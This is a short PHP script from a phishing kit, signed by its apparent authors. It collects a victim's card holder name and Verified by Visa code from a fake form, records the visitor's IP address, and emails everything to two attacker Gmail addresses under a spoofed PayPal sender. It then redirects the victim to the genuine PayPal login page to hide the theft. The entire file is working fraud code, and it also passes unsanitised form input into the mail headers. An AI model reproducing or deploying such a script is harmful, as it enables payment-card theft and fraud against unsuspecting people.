<?php

/*
╔═════════════════════════════╗
╠═══ Fahmi trabelsi safouen═══╣
╠═══════              ════════╣
╠═════════           ═════════╣
╠═                          ══╣
╚═════════════════════════════╝
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['_countr'];

$message .= "=========[VBV  INFOS]=========\n";

$message .= "Card Holder		: ".$_POST['fahmi']."\n";
$message .= "VBV			  : ".$_POST['trabelsi']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BY TraBelsi Fahmi]=========";


$to = "trabelsiifahmi@gmail.com,safou22wow@gmail.com";
$subject = "Vbv Code (100%) $Country [$ip]";
$headers = "From: Fahmi/Safwen (100%)<paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

header("Location:http://www.paypal.com/login");


?>